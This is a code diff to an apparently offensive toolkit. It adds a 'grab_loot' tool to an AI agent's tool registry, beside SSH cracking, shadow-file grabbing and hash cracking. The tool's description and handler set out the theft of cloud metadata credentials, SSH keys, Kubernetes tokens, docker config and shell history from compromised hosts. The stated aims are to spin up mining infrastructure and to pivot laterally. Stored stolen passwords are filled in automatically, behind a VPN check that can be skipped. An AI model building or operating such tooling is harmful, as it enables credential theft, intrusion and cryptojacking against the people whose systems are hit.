@@ -372,6 +372,24 @@ _TOOL_SPECS: list[dict[str, Any]] = [
         },
     },
     {
+        "name": "grab_loot",
+        "description": "Full credential + intel exfil from a popped host. Steals cloud creds (AWS/GCP/Azure IMDS), "
+                       "SSH private keys, k8s tokens, docker config, shell history, and known_hosts. Cloud creds can "
+                       "spawn fresh infrastructure to mine on; SSH keys + known_hosts widen lateral pivoting.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "host": {"type": "string", "description": "ip[:port] of the foothold to loot."},
+                "user": {"type": "string"},
+                "pass": {"type": "string"},
+                "key": {"type": "string"},
+                "stash": {"type": "string", "description": "local stash dir (default .honeywatch/loot_stash)."},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["host"],
+        },
+    },
+    {
         "name": "hashcrack",
         "description": "Offline-crack an /etc/shadow file with hashcat or john, persisting recovered passwords to the store.",
         "parameters": {
@@ -824,6 +842,41 @@ def _tool_grab_shadow(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     return res
 
 
+def _tool_grab_loot(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked the loot. Connect Mullvad or pass skip_vpn_check=true."}
+
+    from honeywatch.cli import parse_host
+    from honeywatch.loot import grab_loot
+
+    ip, port = parse_host(args["host"])
+    user = args.get("user")
+    passw = args.get("pass")
+    # Auto-fill from the credentials store when the operator did not pin creds.
+    if (not user or not passw) and not args.get("key"):
+        cred = ctx.store.credential_for(ip, port)
+        if cred:
+            user = user or cred.get("user")
+            passw = passw or cred.get("password")
+    res = grab_loot(
+        ip=ip, port=port, user=user, password=passw, key_path=args.get("key"),
+        stash_dir=args.get("stash", ".honeywatch/loot_stash"),
+        timeout_s=10.0,
+    )
+    return {
+        "ip": res.ip, "port": res.port,
+        "files": len(res.files),
+        "ssh_keys": len(res.ssh_keys),
+        "cloud_creds": len(res.cloud_creds),
+        "pivot_targets": len(res.pivot_targets),
+        "metadata": res.metadata,
+        "competing_miners": res.competing_miners,
+        "summary": res.summary(),
+        "error": res.error,
+    }
+
+
 def _tool_hashcrack(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     import os
     from honeywatch.crack import default_wordlist_path
@@ -968,6 +1021,7 @@ _tool("set_ollama", _tool_set_ollama)
 _tool("crack_ssh", _tool_crack_ssh)
 _tool("list_credentials", _tool_list_credentials)
 _tool("grab_shadow", _tool_grab_shadow)
+_tool("grab_loot", _tool_grab_loot)
 _tool("hashcrack", _tool_hashcrack)
 _tool("run_chain", _tool_run_chain)
 
